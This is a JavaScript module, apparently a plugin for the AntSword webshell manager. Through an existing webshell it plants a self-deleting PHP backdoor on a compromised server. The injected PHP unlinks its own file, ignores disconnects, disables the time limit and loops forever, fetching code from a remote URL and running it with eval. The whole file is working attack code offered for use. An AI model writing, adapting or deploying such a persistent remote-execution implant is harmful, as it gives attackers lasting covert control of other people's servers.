/**
 * 核心模块
 */

class Core {
  constructor(opt,argv) {
    let self = this;
    return new Promise((res, rej) => {
      let core = new antSword['core'][opt['type']](opt);
      switch (argv.type) {
        case "rm_file":
          // this._save_remote_address(argv.file);
          var rm_file=argv.url.toString().split("###")[0];
          var timeout=argv.url.toString().split("###")[1];
          var patt=/^\d+$/;
          var result=patt.test(timeout);
          if (result){}
          else{return rej("Unexpected value");break;}
          core.request({
              _: this._inject_und3ad(rm_file,timeout)}).then(res)
              .catch((err)=>{return rej(err);});
          core.request({
            _: this._execute_und3ad()}).then(res)
              .catch((err)=>{return rej(err);});
          break;
      }
    })
  }

  // _save_remote_address(address){
  //   // let info = {
  //   //   '_id':"xxmSq3zAOutfCxP8",
  //   //   'url': "http://www.baidu.com",
  //   //   'category': "test",
  //   //   'pwd': "www",
  //   //   'type': "php",
  //   //   'note': "11111111111"
  //   // };
  //   // let data = {
  //   //   'url': "http://www.baidu.com",
  //   //   'category': "test",
  //   //   'pwd': "www",
  //   //   'type': "php",
  //   //   'note': "66666"
  //   // };
  //   // let ret = antSword.ipcRenderer.sendSync('shell-edit', {
  //   //   old: info,
  //   //   new: data
  //   // });
  // }


  _inject_und3ad(rm_file,timeout){
    return `function Injector(){
    $myfile = fopen("testfile.php", "w");
    $txt = '<?php
    unlink(__FILE__);
    ignore_user_abort(true);
    set_time_limit(0);
    $remote_file = "${rm_file}";
    while($code = file_get_contents($remote_file)){
    @eval($code);
    sleep(${timeout});
    };
    ?>';
    fwrite($myfile, $txt);
    };
    Injector();
    `;
  }

  _execute_und3ad(){
    return `include("testfile.php");`
  }

}

module.exports = Core;
